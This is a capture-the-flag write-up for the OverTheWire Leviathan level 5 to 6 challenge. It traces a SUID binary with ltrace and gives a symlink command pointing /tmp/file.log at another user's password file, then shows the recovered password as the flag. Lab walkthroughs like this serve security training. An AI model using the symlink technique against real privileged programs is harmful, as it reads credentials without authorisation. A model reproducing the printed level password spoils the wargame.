## Challenge Info

**Platform:** OverTheWire - Leviathan
**Tags :** #Challenge #ReverseEngineering 
**Completion Date & Time :** 2026 - 01 - 15 / 17:54

---
## FLAG : `szo7HDB88w`

---
## Solution :

### Step 1 : Check for home directory
```shell
leviathan5@leviathan:~$ ls -la
total 36
drwxr-xr-x   2 root       root        4096 Oct 14 09:27 .
drwxr-xr-x 150 root       root        4096 Oct 14 09:29 ..
-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root       root        3851 Oct 14 09:19 .bashrc
-r-sr-x---   1 leviathan6 leviathan5 15144 Oct 14 09:27 leviathan5
-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
```

We could see a SUID file `leviathan5` again. Let's try to run it.
```shell
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
```

It seem it try to open a file `file.log`, lets try to understand using `ltrace` :
```shell
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x804910d, 1, 0xffffd454, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                            = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                      = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

It's clear now, that `leviathan5` file is trying to open a file named `file.log` in `/tmp` folder. So, the idea is, try to make a symbolic link `file.log` to `/etc/leviathan_pass/leviathan6`. This should be work, because we have the privilege of `leviathan6` user to read the password of `leviathan6`.

### Step 2 : Make a symbolic link 
```bash
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```
Now, in `/tmp` we have a symbolic link `file.log` to the password file. 

### Step 3 : Re -run `./leviathan5`
```shell
leviathan5@leviathan:~$ ./leviathan5
szo7HDB88w
```
Now, we have the password `szo7HDB88w` for the next level.

---
### Key Takeaways : 
- Always try to understand how a program works.

---
## Related Concepts : 
[[ltrace]], [[ln]],[[SetUID Files]]

---
## Next Challenge :
[[Leviathan (6 -> 7)]]